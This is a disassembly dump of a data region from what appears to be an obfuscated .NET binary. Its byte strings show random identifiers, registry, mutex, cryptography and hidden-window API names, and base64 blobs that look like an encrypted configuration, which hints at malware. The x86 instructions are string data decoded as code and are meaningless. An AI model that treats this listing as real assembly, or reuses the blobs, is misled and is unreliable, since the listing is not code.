  4098a7:	69 75 00 6b 67 55 6f 	imul   $0x6f55676b,0x0(%ebp),%esi
  4098ae:	61                   	popa
  4098af:	75 53                	jne    0x409904
  4098b1:	62 42 67             	bound  %eax,0x67(%edx)
  4098b4:	44                   	inc    %esp
  4098b5:	58                   	pop    %eax
  4098b6:	79 6e                	jns    0x409926
  4098b8:	75 00                	jne    0x4098ba
  4098ba:	67 6e                	outsb  %ds:(%si),(%dx)
  4098bc:	72 59                	jb     0x409917
  4098be:	61                   	popa
  4098bf:	68 78 48 4e 52       	push   $0x524e4878
  4098c4:	74 70                	je     0x409936
  4098c6:	75 00                	jne    0x4098c8
  4098c8:	47                   	inc    %edi
  4098c9:	73 79                	jae    0x409944
  4098cb:	58                   	pop    %eax
  4098cc:	76 62                	jbe    0x409930
  4098ce:	65 45                	gs inc %ebp
  4098d0:	43                   	inc    %ebx
  4098d1:	72 67                	jb     0x40993a
  4098d3:	6d                   	insl   (%dx),%es:(%edi)
  4098d4:	77 75                	ja     0x40994b
  4098d6:	00 43 6b             	add    %al,0x6b(%ebx)
  4098d9:	55                   	push   %ebp
  4098da:	54                   	push   %esp
  4098db:	69 51 43 59 4e 67 76 	imul   $0x76674e59,0x43(%ecx),%edx
  4098e2:	00 57 6c             	add    %dl,0x6c(%edi)
  4098e5:	6d                   	insl   (%dx),%es:(%edi)
  4098e6:	73 43                	jae    0x40992b
  4098e8:	6c                   	insb   (%dx),%es:(%edi)
  4098e9:	55                   	push   %ebp
  4098ea:	4e                   	dec    %esi
  4098eb:	58                   	pop    %eax
  4098ec:	41                   	inc    %ecx
  4098ed:	58                   	pop    %eax
  4098ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4098ef:	76 00                	jbe    0x4098f1
  4098f1:	6c                   	insb   (%dx),%es:(%edi)
  4098f2:	79 71                	jns    0x409965
  4098f4:	69 6c 48 41 4e 75 6a 	imul   $0x526a754e,0x41(%eax,%ecx,2),%ebp
  4098fb:	52 
  4098fc:	56                   	push   %esi
  4098fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4098fe:	77 76                	ja     0x409976
  409900:	00 43 64             	add    %al,0x64(%ebx)
  409903:	6e                   	outsb  %ds:(%esi),(%dx)
  409904:	6e                   	outsb  %ds:(%esi),(%dx)
  409905:	68 61 51 46 66       	push   $0x66465161
  40990a:	6f                   	outsl  %ds:(%esi),(%dx)
  40990b:	68 44 77 00 68       	push   $0x68007744
  409910:	6a 4a                	push   $0x4a
  409912:	55                   	push   %ebp
  409913:	74 72                	je     0x409987
  409915:	68 6a 45 4d 45       	push   $0x454d456a
  40991a:	77 00                	ja     0x40991c
  40991c:	4a                   	dec    %edx
  40991d:	67 44                	addr16 inc %esp
  40991f:	46                   	inc    %esi
  409920:	59                   	pop    %ecx
  409921:	73 51                	jae    0x409974
  409923:	57                   	push   %edi
  409924:	63 50 57             	arpl   %edx,0x57(%eax)
  409927:	4a                   	dec    %edx
  409928:	77 00                	ja     0x40992a
  40992a:	72 79                	jb     0x4099a5
  40992c:	78 4d                	js     0x40997b
  40992e:	63 4a 57             	arpl   %ecx,0x57(%edx)
  409931:	66 43                	inc    %bx
  409933:	70 73                	jo     0x4099a8
  409935:	4d                   	dec    %ebp
  409936:	77 00                	ja     0x409938
  409938:	49                   	dec    %ecx
  409939:	6e                   	outsb  %ds:(%esi),(%dx)
  40993a:	61                   	popa
  40993b:	73 72                	jae    0x4099af
  40993d:	77 68                	ja     0x4099a7
  40993f:	43                   	inc    %ebx
  409940:	49                   	dec    %ecx
  409941:	50                   	push   %eax
  409942:	77 00                	ja     0x409944
  409944:	78 4f                	js     0x409995
  409946:	4d                   	dec    %ebp
  409947:	57                   	push   %edi
  409948:	4c                   	dec    %esp
  409949:	6c                   	insb   (%dx),%es:(%edi)
  40994a:	4a                   	dec    %edx
  40994b:	45                   	inc    %ebp
  40994c:	70 65                	jo     0x4099b3
  40994e:	58                   	pop    %eax
  40994f:	50                   	push   %eax
  409950:	77 00                	ja     0x409952
  409952:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  409954:	70 4f                	jo     0x4099a5
  409956:	76 4f                	jbe    0x4099a7
  409958:	67 46                	addr16 inc %esi
  40995a:	48                   	dec    %eax
  40995b:	45                   	inc    %ebp
  40995c:	50                   	push   %eax
  40995d:	59                   	pop    %ecx
  40995e:	77 00                	ja     0x409960
  409960:	73 63                	jae    0x4099c5
  409962:	73 54                	jae    0x4099b8
  409964:	79 48                	jns    0x4099ae
  409966:	5a                   	pop    %edx
  409967:	6d                   	insl   (%dx),%es:(%edi)
  409968:	68 6e 61 68 77       	push   $0x7768616e
  40996d:	00 70 49             	add    %dh,0x49(%eax)
  409970:	65 4c                	gs dec %esp
  409972:	73 52                	jae    0x4099c6
  409974:	48                   	dec    %eax
  409975:	4b                   	dec    %ebx
  409976:	6a 77                	push   $0x77
  409978:	00 73 65             	add    %dh,0x65(%ebx)
  40997b:	74 5f                	je     0x4099dc
  40997d:	43                   	inc    %ebx
  40997e:	72 65                	jb     0x4099e5
  409980:	61                   	popa
  409981:	74 65                	je     0x4099e8
  409983:	4e                   	dec    %esi
  409984:	6f                   	outsl  %ds:(%esi),(%dx)
  409985:	57                   	push   %edi
  409986:	69 6e 64 6f 77 00 49 	imul   $0x4900776f,0x64(%esi),%ebp
  40998d:	68 48 69 65 6f       	push   $0x6f656948
  409992:	79 64                	jns    0x4099f8
  409994:	50                   	push   %eax
  409995:	4b                   	dec    %ebx
  409996:	73 77                	jae    0x409a0f
  409998:	00 6a 76             	add    %ch,0x76(%edx)
  40999b:	66 73 59             	data16 jae 0x4099f7
  40999e:	4a                   	dec    %edx
  40999f:	47                   	inc    %edi
  4099a0:	6b 50 6e 75          	imul   $0x75,0x6e(%eax),%edx
  4099a4:	77 00                	ja     0x4099a6
  4099a6:	4c                   	dec    %esp
  4099a7:	58                   	pop    %eax
  4099a8:	67 74 71             	addr16 je 0x409a1c
  4099ab:	52                   	push   %edx
  4099ac:	77 67                	ja     0x409a15
  4099ae:	6d                   	insl   (%dx),%es:(%edi)
  4099af:	45                   	inc    %ebp
  4099b0:	78 00                	js     0x4099b2
  4099b2:	75 53                	jne    0x409a07
  4099b4:	73 59                	jae    0x409a0f
  4099b6:	66 73 73             	data16 jae 0x409a2c
  4099b9:	45                   	inc    %ebp
  4099ba:	41                   	inc    %ecx
  4099bb:	78 62                	js     0x409a1f
  4099bd:	78 00                	js     0x4099bf
  4099bf:	4d                   	dec    %ebp
  4099c0:	75 74                	jne    0x409a36
  4099c2:	65 78 00             	gs js  0x4099c5
  4099c5:	56                   	push   %esi
  4099c6:	75 55                	jne    0x409a1d
  4099c8:	67 69 5a 4c 44 72 68 	imul   $0x78687244,0x4c(%bp,%si),%ebx
  4099cf:	78 
  4099d0:	00 51 4d             	add    %dl,0x4d(%ecx)
  4099d3:	47                   	inc    %edi
  4099d4:	6d                   	insl   (%dx),%es:(%edi)
  4099d5:	61                   	popa
  4099d6:	52                   	push   %edx
  4099d7:	44                   	inc    %esp
  4099d8:	47                   	inc    %edi
  4099d9:	53                   	push   %ebx
  4099da:	67 61                	addr16 popa
  4099dc:	62 69 78             	bound  %ebp,0x78(%ecx)
  4099df:	00 6f 48             	add    %ch,0x48(%edi)
  4099e2:	59                   	pop    %ecx
  4099e3:	6b 47 48 68          	imul   $0x68,0x48(%edi),%eax
  4099e7:	72 6f                	jb     0x409a58
  4099e9:	78 00                	js     0x4099eb
  4099eb:	54                   	push   %esp
  4099ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4099ed:	67 75 41             	addr16 jne 0x409a31
  4099f0:	4c                   	dec    %esp
  4099f1:	5a                   	pop    %edx
  4099f2:	51                   	push   %ecx
  4099f3:	4d                   	dec    %ebp
  4099f4:	4c                   	dec    %esp
  4099f5:	6b 75 78 00          	imul   $0x0,0x78(%ebp),%esi
  4099f9:	47                   	inc    %edi
  4099fa:	78 56                	js     0x409a52
  4099fc:	48                   	dec    %eax
  4099fd:	4c                   	dec    %esp
  4099fe:	79 7a                	jns    0x409a7a
  409a00:	7a 53                	jp     0x409a55
  409a02:	52                   	push   %edx
  409a03:	4f                   	dec    %edi
  409a04:	70 43                	jo     0x409a49
  409a06:	4c                   	dec    %esp
  409a07:	79 00                	jns    0x409a09
  409a09:	49                   	dec    %ecx
  409a0a:	6e                   	outsb  %ds:(%esi),(%dx)
  409a0b:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409a12:	65 
  409a13:	41                   	inc    %ecx
  409a14:	72 72                	jb     0x409a88
  409a16:	61                   	popa
  409a17:	79 00                	jns    0x409a19
  409a19:	54                   	push   %esp
  409a1a:	6f                   	outsl  %ds:(%esi),(%dx)
  409a1b:	41                   	inc    %ecx
  409a1c:	72 72                	jb     0x409a90
  409a1e:	61                   	popa
  409a1f:	79 00                	jns    0x409a21
  409a21:	67 65 74 5f          	addr16 gs je 0x409a84
  409a25:	41                   	inc    %ecx
  409a26:	73 41                	jae    0x409a69
  409a28:	72 72                	jb     0x409a9c
  409a2a:	61                   	popa
  409a2b:	79 00                	jns    0x409a2d
  409a2d:	67 65 74 5f          	addr16 gs je 0x409a90
  409a31:	4b                   	dec    %ebx
  409a32:	65 79 00             	gs jns 0x409a35
  409a35:	73 65                	jae    0x409a9c
  409a37:	74 5f                	je     0x409a98
  409a39:	4b                   	dec    %ebx
  409a3a:	65 79 00             	gs jns 0x409a3d
  409a3d:	43                   	inc    %ebx
  409a3e:	72 65                	jb     0x409aa5
  409a40:	61                   	popa
  409a41:	74 65                	je     0x409aa8
  409a43:	53                   	push   %ebx
  409a44:	75 62                	jne    0x409aa8
  409a46:	4b                   	dec    %ebx
  409a47:	65 79 00             	gs jns 0x409a4a
  409a4a:	4f                   	dec    %edi
  409a4b:	70 65                	jo     0x409ab2
  409a4d:	6e                   	outsb  %ds:(%esi),(%dx)
  409a4e:	53                   	push   %ebx
  409a4f:	75 62                	jne    0x409ab3
  409a51:	4b                   	dec    %ebx
  409a52:	65 79 00             	gs jns 0x409a55
  409a55:	67 65 74 5f          	addr16 gs je 0x409ab8
  409a59:	50                   	push   %eax
  409a5a:	75 62                	jne    0x409abe
  409a5c:	6c                   	insb   (%dx),%es:(%edi)
  409a5d:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409a64:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409a6b:	4b 65 
  409a6d:	79 00                	jns    0x409a6f
  409a6f:	53                   	push   %ebx
  409a70:	79 73                	jns    0x409ae5
  409a72:	74 65                	je     0x409ad9
  409a74:	6d                   	insl   (%dx),%es:(%edi)
  409a75:	2e 53                	cs push %ebx
  409a77:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409a7b:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409a82:	70 
  409a83:	74 6f                	je     0x409af4
  409a85:	67 72 61             	addr16 jb 0x409ae9
  409a88:	70 68                	jo     0x409af2
  409a8a:	79 00                	jns    0x409a8c
  409a8c:	6a 44                	push   $0x44
  409a8e:	59                   	pop    %ecx
  409a8f:	55                   	push   %ebp
  409a90:	7a 54                	jp     0x409ae6
  409a92:	69 4a 48 51 69 79 00 	imul   $0x796951,0x48(%edx),%ecx
  409a99:	41                   	inc    %ecx
  409a9a:	73 73                	jae    0x409b0f
  409a9c:	65 6d                	gs insl (%dx),%es:(%edi)
  409a9e:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409aa2:	41                   	inc    %ecx
  409aa3:	64 64 72 65          	fs fs jb 0x409b0c
  409aa7:	73 73                	jae    0x409b1c
  409aa9:	46                   	inc    %esi
  409aaa:	61                   	popa
  409aab:	6d                   	insl   (%dx),%es:(%edi)
  409aac:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409ab3:	63 
  409ab4:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409ab8:	79 00                	jns    0x409aba
  409aba:	54                   	push   %esp
  409abb:	6f                   	outsl  %ds:(%esi),(%dx)
  409abc:	42                   	inc    %edx
  409abd:	69 6e 61 72 79 00 6d 	imul   $0x6d007972,0x61(%esi),%ebp
  409ac4:	41                   	inc    %ecx
  409ac5:	71 6c                	jno    0x409b33
  409ac7:	68 76 4e 7a 6f       	push   $0x6f7a4e76
  409acc:	52                   	push   %edx
  409acd:	79 66                	jns    0x409b35
  409acf:	72 79                	jb     0x409b4a
  409ad1:	00 5a 76             	add    %bl,0x76(%edx)
  409ad4:	67 45                	addr16 inc %ebp
  409ad6:	77 64                	ja     0x409b3c
  409ad8:	52                   	push   %edx
  409ad9:	6c                   	insb   (%dx),%es:(%edi)
  409ada:	69 72 79 00 67 65 74 	imul   $0x74656700,0x79(%edx),%esi
  409ae1:	5f                   	pop    %edi
  409ae2:	53                   	push   %ebx
  409ae3:	79 73                	jns    0x409b58
  409ae5:	74 65                	je     0x409b4c
  409ae7:	6d                   	insl   (%dx),%es:(%edi)
  409ae8:	44                   	inc    %esp
  409ae9:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409af0:	79 00                	jns    0x409af2
  409af2:	52                   	push   %edx
  409af3:	65 67 69 73 74 72 79 	imul   $0x45007972,%gs:0x74(%bp,%di),%esi
  409afa:	00 45 
  409afc:	46                   	inc    %esi
  409afd:	74 75                	je     0x409b74
  409aff:	4a                   	dec    %edx
  409b00:	69 59 57 43 73 79 00 	imul   $0x797343,0x57(%ecx),%ebx
  409b07:	6f                   	outsl  %ds:(%esi),(%dx)
  409b08:	70 5f                	jo     0x409b69
  409b0a:	45                   	inc    %ebp
  409b0b:	71 75                	jno    0x409b82
  409b0d:	61                   	popa
  409b0e:	6c                   	insb   (%dx),%es:(%edi)
  409b0f:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409b16:	49 
  409b17:	6e                   	outsb  %ds:(%esi),(%dx)
  409b18:	65 71 75             	gs jno 0x409b90
  409b1b:	61                   	popa
  409b1c:	6c                   	insb   (%dx),%es:(%edi)
  409b1d:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409b24:	74 
  409b25:	65 6d                	gs insl (%dx),%es:(%edi)
  409b27:	2e 4e                	cs dec %esi
  409b29:	65 74 2e             	gs je  0x409b5a
  409b2c:	53                   	push   %ebx
  409b2d:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409b31:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409b38:	64 
  409b39:	6f                   	outsl  %ds:(%esi),(%dx)
  409b3a:	77 73                	ja     0x409baf
  409b3c:	49                   	dec    %ecx
  409b3d:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409b40:	74 69                	je     0x409bab
  409b42:	74 79                	je     0x409bbd
  409b44:	00 49 73             	add    %cl,0x73(%ecx)
  409b47:	4e                   	dec    %esi
  409b48:	75 6c                	jne    0x409bb6
  409b4a:	6c                   	insb   (%dx),%es:(%edi)
  409b4b:	4f                   	dec    %edi
  409b4c:	72 45                	jb     0x409b93
  409b4e:	6d                   	insl   (%dx),%es:(%edi)
  409b4f:	70 74                	jo     0x409bc5
  409b51:	79 00                	jns    0x409b53
  409b53:	7a 72                	jp     0x409bc7
  409b55:	42                   	inc    %edx
  409b56:	6c                   	insb   (%dx),%es:(%edi)
  409b57:	70 4b                	jo     0x409ba4
  409b59:	59                   	pop    %ecx
  409b5a:	67 75 6e             	addr16 jne 0x409bcb
  409b5d:	64 63 77 79          	arpl   %esi,%fs:0x79(%edi)
  409b61:	00 00                	add    %al,(%eax)
  409b63:	00 00                	add    %al,(%eax)
  409b65:	0d 53 00 48 00       	or     $0x480053,%eax
  409b6a:	41                   	inc    %ecx
  409b6b:	00 32                	add    %dh,(%edx)
  409b6d:	00 35 00 36 00 00    	add    %dh,0x3600
  409b73:	80 d9 36             	sbb    $0x36,%cl
  409b76:	00 72 00             	add    %dh,0x0(%edx)
  409b79:	74 00                	je     0x409b7b
  409b7b:	75 00                	jne    0x409b7d
  409b7d:	41                   	inc    %ecx
  409b7e:	00 7a 00             	add    %bh,0x0(%edx)
  409b81:	4e                   	dec    %esi
  409b82:	00 7a 00             	add    %bh,0x0(%edx)
  409b85:	67 00 33             	add    %dh,(%bp,%di)
  409b88:	00 56 00             	add    %dl,0x0(%esi)
  409b8b:	2f                   	das
  409b8c:	00 30                	add    %dh,(%eax)
  409b8e:	00 78 00             	add    %bh,0x0(%eax)
  409b91:	2f                   	das
  409b92:	00 55 00             	add    %dl,0x0(%ebp)
  409b95:	6d                   	insl   (%dx),%es:(%edi)
  409b96:	00 48 00             	add    %cl,0x0(%eax)
  409b99:	39 00                	cmp    %eax,(%eax)
  409b9b:	74 00                	je     0x409b9d
  409b9d:	46                   	inc    %esi
  409b9e:	00 33                	add    %dh,(%ebx)
  409ba0:	00 42 00             	add    %al,0x0(%edx)
  409ba3:	5a                   	pop    %edx
  409ba4:	00 32                	add    %dh,(%edx)
  409ba6:	00 43 00             	add    %al,0x0(%ebx)
  409ba9:	6a 00                	push   $0x0
  409bab:	48                   	dec    %eax
  409bac:	00 4b 00             	add    %cl,0x0(%ebx)
  409baf:	41                   	inc    %ecx
  409bb0:	00 61 00             	add    %ah,0x0(%ecx)
  409bb3:	53                   	push   %ebx
  409bb4:	00 6e 00             	add    %ch,0x0(%esi)
  409bb7:	6a 00                	push   $0x0
  409bb9:	58                   	pop    %eax
  409bba:	00 41 00             	add    %al,0x0(%ecx)
  409bbd:	73 00                	jae    0x409bbf
  409bbf:	50                   	push   %eax
  409bc0:	00 67 00             	add    %ah,0x0(%edi)
  409bc3:	30 00                	xor    %al,(%eax)
  409bc5:	35 00 36 00 48       	xor    $0x48003600,%eax
  409bca:	00 72 00             	add    %dh,0x0(%edx)
  409bcd:	6b 00 71             	imul   $0x71,(%eax),%eax
  409bd0:	00 6a 00             	add    %ch,0x0(%edx)
  409bd3:	32 00                	xor    (%eax),%al
  409bd5:	76 00                	jbe    0x409bd7
  409bd7:	69 00 69 00 77 00    	imul   $0x770069,(%eax),%eax
  409bdd:	51                   	push   %ecx
  409bde:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  409be2:	00 61 00             	add    %ah,0x0(%ecx)
  409be5:	79 00                	jns    0x409be7
  409be7:	68 00 34 00 59       	push   $0x59003400
  409bec:	00 79 00             	add    %bh,0x0(%ecx)
  409bef:	43                   	inc    %ebx
  409bf0:	00 30                	add    %dh,(%eax)
  409bf2:	00 77 00             	add    %dh,0x0(%edi)
  409bf5:	55                   	push   %ebp
  409bf6:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  409bfa:	00 42 00             	add    %al,0x0(%edx)
  409bfd:	74 00                	je     0x409bff
  409bff:	58                   	pop    %eax
  409c00:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c03:	62 00                	bound  %eax,(%eax)
  409c05:	39 00                	cmp    %eax,(%eax)
  409c07:	66 00 30             	data16 add %dh,(%eax)
  409c0a:	00 79 00             	add    %bh,0x0(%ecx)
  409c0d:	59                   	pop    %ecx
  409c0e:	00 68 00             	add    %ch,0x0(%eax)
  409c11:	6d                   	insl   (%dx),%es:(%edi)
  409c12:	00 52 00             	add    %dl,0x0(%edx)
  409c15:	44                   	inc    %esp
  409c16:	00 71 00             	add    %dh,0x0(%ecx)
  409c19:	4f                   	dec    %edi
  409c1a:	00 71 00             	add    %dh,0x0(%ecx)
  409c1d:	58                   	pop    %eax
  409c1e:	00 70 00             	add    %dh,0x0(%eax)
  409c21:	59                   	pop    %ecx
  409c22:	00 43 00             	add    %al,0x0(%ebx)
  409c25:	47                   	inc    %edi
  409c26:	00 63 00             	add    %ah,0x0(%ebx)
  409c29:	72 00                	jb     0x409c2b
  409c2b:	4a                   	dec    %edx
  409c2c:	00 52 00             	add    %dl,0x0(%edx)
  409c2f:	55                   	push   %ebp
  409c30:	00 57 00             	add    %dl,0x0(%edi)
  409c33:	33 00                	xor    (%eax),%eax
  409c35:	32 00                	xor    (%eax),%al
  409c37:	4e                   	dec    %esi
  409c38:	00 61 00             	add    %ah,0x0(%ecx)
  409c3b:	73 00                	jae    0x409c3d
  409c3d:	72 00                	jb     0x409c3f
  409c3f:	4c                   	dec    %esp
  409c40:	00 45 00             	add    %al,0x0(%ebp)
  409c43:	4c                   	dec    %esp
  409c44:	00 43 00             	add    %al,0x0(%ebx)
  409c47:	52                   	push   %edx
  409c48:	00 51 00             	add    %dl,0x0(%ecx)
  409c4b:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  409c50:	61                   	popa
  409c51:	00 4e 00             	add    %cl,0x0(%esi)
  409c54:	78 00                	js     0x409c56
  409c56:	6e                   	outsb  %ds:(%esi),(%dx)
  409c57:	00 63 00             	add    %ah,0x0(%ebx)
  409c5a:	6e                   	outsb  %ds:(%esi),(%dx)
  409c5b:	00 6b 00             	add    %ch,0x0(%ebx)
  409c5e:	42                   	inc    %edx
  409c5f:	00 72 00             	add    %dh,0x0(%edx)
  409c62:	39 00                	cmp    %eax,(%eax)
  409c64:	74 00                	je     0x409c66
  409c66:	66 00 4c 00 50       	data16 add %cl,0x50(%eax,%eax,1)
  409c6b:	00 59 00             	add    %bl,0x0(%ecx)
  409c6e:	63 00                	arpl   %eax,(%eax)
  409c70:	30 00                	xor    %al,(%eax)
  409c72:	76 00                	jbe    0x409c74
  409c74:	56                   	push   %esi
  409c75:	00 36                	add    %dh,(%esi)
  409c77:	00 2f                	add    %ch,(%edi)
  409c79:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  409c7d:	00 7a 00             	add    %bh,0x0(%edx)
  409c80:	79 00                	jns    0x409c82
  409c82:	43                   	inc    %ebx
  409c83:	00 45 00             	add    %al,0x0(%ebp)
  409c86:	56                   	push   %esi
  409c87:	00 39                	add    %bh,(%ecx)
  409c89:	00 31                	add    %dh,(%ecx)
  409c8b:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c8e:	38 00                	cmp    %al,(%eax)
  409c90:	33 00                	xor    (%eax),%eax
  409c92:	6f                   	outsl  %ds:(%esi),(%dx)
  409c93:	00 4b 00             	add    %cl,0x0(%ebx)
  409c96:	41                   	inc    %ecx
  409c97:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c9a:	4f                   	dec    %edi
  409c9b:	00 76 00             	add    %dh,0x0(%esi)
  409c9e:	78 00                	js     0x409ca0
  409ca0:	33 00                	xor    (%eax),%eax
  409ca2:	44                   	inc    %esp
  409ca3:	00 49 00             	add    %cl,0x0(%ecx)
  409ca6:	4f                   	dec    %edi
  409ca7:	00 49 00             	add    %cl,0x0(%ecx)
  409caa:	6e                   	outsb  %ds:(%esi),(%dx)
  409cab:	00 76 00             	add    %dh,0x0(%esi)
  409cae:	35 00 47 00 36       	xor    $0x36004700,%eax
  409cb3:	00 35 00 51 00 79    	add    %dh,0x79005100
  409cb9:	00 43 00             	add    %al,0x0(%ebx)
  409cbc:	44                   	inc    %esp
  409cbd:	00 6a 00             	add    %ch,0x0(%edx)
  409cc0:	63 00                	arpl   %eax,(%eax)
  409cc2:	52                   	push   %edx
  409cc3:	00 41 00             	add    %al,0x0(%ecx)
  409cc6:	48                   	dec    %eax
  409cc7:	00 69 00             	add    %ch,0x0(%ecx)
  409cca:	71 00                	jno    0x409ccc
  409ccc:	38 00                	cmp    %al,(%eax)
  409cce:	5a                   	pop    %edx
  409ccf:	00 30                	add    %dh,(%eax)
  409cd1:	00 47 00             	add    %al,0x0(%edi)
  409cd4:	6e                   	outsb  %ds:(%esi),(%dx)
  409cd5:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  409cd9:	00 2f                	add    %ch,(%edi)
  409cdb:	00 66 00             	add    %ah,0x0(%esi)
  409cde:	68 00 4e 00 58       	push   $0x58004e00
  409ce3:	00 57 00             	add    %dl,0x0(%edi)
  409ce6:	31 00                	xor    %eax,(%eax)
  409ce8:	2f                   	das
  409ce9:	00 38                	add    %bh,(%eax)
  409ceb:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  409cef:	00 76 00             	add    %dh,0x0(%esi)
  409cf2:	2b 00                	sub    (%eax),%eax
  409cf4:	71 00                	jno    0x409cf6
  409cf6:	32 00                	xor    (%eax),%al
  409cf8:	6b 00 41             	imul   $0x41,(%eax),%eax
  409cfb:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  409d01:	80 b1 44 00 4d 00 32 	xorb   $0x32,0x4d0044(%ecx)
  409d08:	00 36                	add    %dh,(%esi)
  409d0a:	00 57 00             	add    %dl,0x0(%edi)
  409d0d:	6c                   	insb   (%dx),%es:(%edi)
  409d0e:	00 47 00             	add    %al,0x0(%edi)
  409d11:	57                   	push   %edi
  409d12:	00 5a 00             	add    %bl,0x0(%edx)
  409d15:	4d                   	dec    %ebp
  409d16:	00 79 00             	add    %bh,0x0(%ecx)
  409d19:	76 00                	jbe    0x409d1b
  409d1b:	43                   	inc    %ebx
  409d1c:	00 49 00             	add    %cl,0x0(%ecx)
  409d1f:	50                   	push   %eax
  409d20:	00 31                	add    %dh,(%ecx)
  409d22:	00 46 00             	add    %al,0x0(%esi)
  409d25:	75 00                	jne    0x409d27
  409d27:	2f                   	das
  409d28:	00 50 00             	add    %dl,0x0(%eax)
  409d2b:	46                   	inc    %esi
  409d2c:	00 4b 00             	add    %cl,0x0(%ebx)
  409d2f:	42                   	inc    %edx
  409d30:	00 58 00             	add    %bl,0x0(%eax)
  409d33:	56                   	push   %esi
  409d34:	00 79 00             	add    %bh,0x0(%ecx)
  409d37:	47                   	inc    %edi
  409d38:	00 47 00             	add    %al,0x0(%edi)
  409d3b:	4e                   	dec    %esi
  409d3c:	00 73 00             	add    %dh,0x0(%ebx)
  409d3f:	6c                   	insb   (%dx),%es:(%edi)
  409d40:	00 45 00             	add    %al,0x0(%ebp)
  409d43:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  409d47:	7a 00                	jp     0x409d49
  409d49:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  409d4d:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  409d51:	56                   	push   %esi
  409d52:	00 71 00             	add    %dh,0x0(%ecx)
  409d55:	6b 00 71             	imul   $0x71,(%eax),%eax
  409d58:	00 2f                	add    %ch,(%edi)
  409d5a:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  409d5e:	00 36                	add    %dh,(%esi)
  409d60:	00 67 00             	add    %ah,0x0(%edi)
  409d63:	63 00                	arpl   %eax,(%eax)
  409d65:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  409d69:	4d                   	dec    %ebp
  409d6a:	00 7a 00             	add    %bh,0x0(%edx)
  409d6d:	6b 00 36             	imul   $0x36,(%eax),%eax
  409d70:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  409d74:	00 32                	add    %dh,(%edx)
  409d76:	00 38                	add    %bh,(%eax)
  409d78:	00 49 00             	add    %cl,0x0(%ecx)
  409d7b:	42                   	inc    %edx
  409d7c:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  409d80:	00 33                	add    %dh,(%ebx)
  409d82:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  409d86:	00 4b 00             	add    %cl,0x0(%ebx)
  409d89:	49                   	dec    %ecx
  409d8a:	00 36                	add    %dh,(%esi)
  409d8c:	00 30                	add    %dh,(%eax)
  409d8e:	00 2f                	add    %ch,(%edi)
  409d90:	00 4d 00             	add    %cl,0x0(%ebp)
  409d93:	53                   	push   %ebx
  409d94:	00 2f                	add    %ch,(%edi)
  409d96:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  409d9a:	00 78 00             	add    %bh,0x0(%eax)
  409d9d:	59                   	pop    %ecx
  409d9e:	00 58 00             	add    %bl,0x0(%eax)
  409da1:	6b 00 58             	imul   $0x58,(%eax),%eax
  409da4:	00 76 00             	add    %dh,0x0(%esi)
  409da7:	6c                   	insb   (%dx),%es:(%edi)
  409da8:	00 30                	add    %dh,(%eax)
  409daa:	00 73 00             	add    %dh,0x0(%ebx)
  409dad:	77 00                	ja     0x409daf
  409daf:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409db4:	80 b1 6a 00 39 00 54 	xorb   $0x54,0x39006a(%ecx)
  409dbb:	00 38                	add    %bh,(%eax)
  409dbd:	00 43 00             	add    %al,0x0(%ebx)
  409dc0:	6a 00                	push   $0x0
  409dc2:	56                   	push   %esi
  409dc3:	00 57 00             	add    %dl,0x0(%edi)
  409dc6:	75 00                	jne    0x409dc8
  409dc8:	48                   	dec    %eax
  409dc9:	00 42 00             	add    %al,0x0(%edx)
  409dcc:	57                   	push   %edi
  409dcd:	00 4f 00             	add    %cl,0x0(%edi)
  409dd0:	54                   	push   %esp
  409dd1:	00 4b 00             	add    %cl,0x0(%ebx)
  409dd4:	4a                   	dec    %edx
  409dd5:	00 50 00             	add    %dl,0x0(%eax)
  409dd8:	41                   	inc    %ecx
  409dd9:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  409ddd:	00 63 00             	add    %ah,0x0(%ebx)
  409de0:	39 00                	cmp    %eax,(%eax)
  409de2:	4d                   	dec    %ebp
  409de3:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  409de7:	00 63 00             	add    %ah,0x0(%ebx)
  409dea:	56                   	push   %esi
  409deb:	00 38                	add    %bh,(%eax)
  409ded:	00 46 00             	add    %al,0x0(%esi)
  409df0:	4b                   	dec    %ebx
  409df1:	00 6e 00             	add    %ch,0x0(%esi)
